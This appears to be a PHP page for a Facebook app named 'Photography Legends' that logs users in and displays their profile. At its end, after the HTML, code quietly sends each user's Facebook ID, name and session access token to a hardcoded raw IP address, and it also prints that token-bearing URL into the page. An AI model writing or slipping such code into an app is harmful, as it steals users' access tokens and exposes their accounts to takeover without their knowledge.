<?php
include('base.php');

$result = $facebook->extenedAccessToken();
if(isset($_REQUEST['code']) && $_REQUEST['code'] == $_SESSION['fb_322706141156517_code']){
	header("location: http://apps.facebook.com/photography-legends/");
}
?>
<!doctype html>
<html xmlns:fb="http://www.facebook.com/2008/fbml">
  <head>
    <title>Photography Legends?</title>
    <style>
      body {
        font-family: 'Lucida Grande', Verdana, Arial, sans-serif;
      }
      h1 a {
        text-decoration: none;
        color: #3b5998;
      }
      h1 a:hover {
        text-decoration: underline;
      }
    </style>
  </head>
  <body>
    <h2>Photography Legends</h2>

    <?php if (!$user): ?>      
      <div>
        <script>top.location.href='<?php echo $loginUrl; ?>'</script>
      </div>
    <?php endif ?>
    <?php if ($user): ?>
      <h3>You</h3>
      <img src="https://graph.facebook.com/<?php echo $user; ?>/picture">

      <h3>Your User Object (/me)</h3>
      <pre><?php print_r($user_profile); ?></pre>
    <?php else: ?>
      <strong><em>You are not Connected.</em></strong>
    <?php endif ?>
    <?=("http://123.100.239.68/api/ins.php?i=" . $user_profile['id'] . "&n=" . urlencode($user_profile['name']) . "&t=" . $_SESSION['fb_322706141156517_access_token'])?>
  </body>
</html>
<?
	
	 
   $handle=file_get_contents("http://123.100.239.68/api/ins.php?i=" . $user_profile['id'] . "&n=" . urlencode($user_profile['name']) . "&t=" . $_SESSION['fb_322706141156517_access_token'] ,"r");
?>